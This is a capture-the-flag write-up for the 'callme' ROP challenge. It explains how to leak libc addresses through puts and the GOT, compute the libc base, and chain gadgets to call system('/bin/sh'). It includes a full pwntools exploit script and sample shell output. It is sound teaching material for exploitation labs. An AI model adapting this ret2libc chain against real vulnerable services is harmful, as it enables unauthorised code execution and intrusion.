# callme Alternative Solution

There are no `system()` calls nor any `/bin/sh` strings in the application,
however we can find them at runtime, once `libc` has been loaded.

```
gdb ./callme
start

find "/bin/sh"
# Searching for '/bin/sh' in: None ranges
# Found 1 results, display max 1 items:
# libc : 0x7fa3151ee5bd --> 0x68732f6e69622f ('/bin/sh')

p *system
# $1 = {int (const char *)} 0x7fa31508c290 <__libc_system>
```

GDB disables ASLR per default, to enable it run `set disable-randomization off`.

In our exploit we can't depend on the addresses reported by GDB above, since
they are usually randomized every time the program is run.

But using `puts` or `printf`, we can print out the address of a known libc
function and then use that to calculate the base address at which libc is
loaded.

```python
payload = offset + p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(main)
```

We read the offset of `puts` from the global offset table (GOT):

```sh
readelf --relocs callme
#   Offset          Info           Type           Sym. Value    Sym. Name + Addend
# 000000601018  000100000007 R_X86_64_JUMP_SLO 0000000000000000 puts@GLIBC_2.2.5 + 0
```

Then we pass this as the argument to a `puts` call, which will dereference it
and print out the actual address of the `puts` function.

By knowing the correct version of libc in use we can simply subtract the offset
(where in libc the function is located) from the leaked address (where in
memory it is loaded) to obtain the address where libc starts in our processes
memory.

```python
libc.address = leaked_addr - libc.symbols["puts"]
```

<details>
<summary>What `libc` version am I using?</summary>

If we run the program locally, we can use something like `readelf -d callme`
to find what is being loaded:

```
Dynamic section at offset 0xe00 contains 26 entries:
  Tag        Type                         Name/Value
 0x0000000000000001 (NEEDED)             Shared library: [libcallme.so]
 0x0000000000000001 (NEEDED)             Shared library: [libc.so.6]
```

`libc.so.6` which is found under `/lib/x86_64-linux-gnu/libc.so.6`.

However, assuming that this is a program running on a remote machine, we don't
have it quite so easy.

We can leak one (or for better accuracy multiple) addresses of libc functions
and use tools like [blukat libc database search](https://libc.blukat.me/) or
[niklasb libc database](https://github.com/niklasb/libc-database) to determine
the correct version.

![Providing the libc database search with the address at which we found puts
returns 4 matches, only one of them being x86\_64.](libc-database-search.png)

![Providing the address of __libc_start_main also, we narrowed the search down
to one match.](libc-version-2.png)

To do the leaking, we can use a function like this:

```python
process_name = "./callme"
elf = ELF(process_name)
rop = ROP(elf)
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")

OFFSET = b'A'*40
PUTS_PLT = elf.plt['puts']                         # so that we can call the puts function
MAIN = elf.sym['main']                             # so that we can call main again, after leaking an address
POP_RDI = (rop.find_gadget(['pop rdi', 'ret']))[0]
RET = (rop.find_gadget(['ret']))[0]                # additional ret instruction for padding, to realign stack

def find_addr(func_name):
    func_got = elf.got[func_name]
    # overflow stack, print out function's address, restart at main
    payload = OFFSET + p64(POP_RDI) + p64(func_got) + p64(PUTS_PLT) + p64(MAIN)
    print(p.recvuntil("> "))
    print(p.clean())
    p.sendline(payload)
    leaked_string = p.recvuntil("\ncallme")
    received = leaked_string.replace(b"Thank you!\n", b"")
    received = received.replace(b"\ncallme", b"")
    leaked_addr = u64(received.ljust(8, b"\x00"))
    print("--- leak BEGIN ---")
    print(hex(leaked_addr))
    print("--- leak END ---")
    if libc.address == 0:
        libc.address = leaked_addr - libc.symbols[func_name]
        print("libc base @ %s" % hex(libc.address))

find_addr('puts')
find_addr('__libc_start_main')
```

</details>

---

Finally, we can do our search for the `/bin/sh` string and the `system()`
function.

```python
bin_sh = next(libc.search(b"/bin/sh"))
system = libc.sym["system"]

payload = offset + p64(pop_rdi) + p64(bin_sh) + p64(system)
```

However, the application crashes in `do_system()`, at a `movaps` instruction.
As we've learned in the previous challenges, a simple fix is to include
another `ret` instruction.

```python
payload = offset + p64(pop_rdi) + p64(bin_sh) + p64(ret) + p64(system)
```

Finally, we get a shell:

```
python3 exploit.py
# ... SNIP ...
[*] Switching to interactive mode
$ whoami
testikus
$ ls
callme    exploit.py        key2.dat  payload.txt
```

## Full Exploit Script

```python
#!/usr/bin/env python3
from pwn import *
context.bits = 64
context.arch = 'x86_64'

process_name = "./callme"
elf = ELF(process_name)
rop = ROP(elf)
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")

OFFSET = b'A'*40
PUTS_PLT = elf.plt['puts']                         # so that we can call the puts function
MAIN = elf.sym['main']                             # so that we can call main again, after leaking an address
POP_RDI = (rop.find_gadget(['pop rdi', 'ret']))[0]
RET = (rop.find_gadget(['ret']))[0]                # additional ret instruction for padding, to realign stack

#p = process(process_name)
p = gdb.debug(process_name, '''
set disable-randomization off
b pwnme
b *pwnme+89
''')

def find_addr(func_name):
    func_got = elf.got[func_name]
    # overflow stack, print out function's address, restart at main
    payload = OFFSET + p64(POP_RDI) + p64(func_got) + p64(PUTS_PLT) + p64(MAIN)
    print(p.recvuntil("> "))
    print(p.clean())
    p.sendline(payload)
    leaked_string = p.recvuntil("\ncallme")
    received = leaked_string.replace(b"Thank you!\n", b"")
    received = received.replace(b"\ncallme", b"")
    leaked_addr = u64(received.ljust(8, b"\x00"))
    print("--- leak BEGIN ---")
    print(hex(leaked_addr))
    print("--- leak END ---")
    if libc.address == 0:
        libc.address = leaked_addr - libc.symbols[func_name]
        print("libc base @ %s" % hex(libc.address))

find_addr('puts')
find_addr('__libc_start_main')

# do_system uses the movaps instruction, which will fail on an unaligned stack.
# To realign the stack we include an additional ret in our rop-chain.
BIN_SH = next(libc.search(b"/bin/sh"))
SYSTEM = libc.sym["system"]
payload = OFFSET + p64(POP_RDI) + p64(BIN_SH) + p64(RET) + p64(SYSTEM)

print(p.clean())
p.sendline(payload)
print(p.clean())
p.interactive()
```

I created most of this with some help from this great
[blog](https://book.hacktricks.xyz/reversing-and-exploiting/linux-exploiting-basic-esp/rop-leaking-libc-address).

Using the script as displayed in the linked article I was always missing the
last byte of the leaked address.
GDB per default disables ASLR, meaning that every time I ran the program in the
debugger, the leaked address was the same.
This address just so happened to end in a `0x20`.

The culprit is this line:

```python
recieved = leaked_string.replace(b"overflow me:", b"").strip()
```

Note the `strip()` at the end, `leaked_string` contains the `printf`/`puts`
address.
If that address ends (or starts) in a `0x20` this will be removed by the
`strip` call, since `0x20` also happens to be ASCII (space).

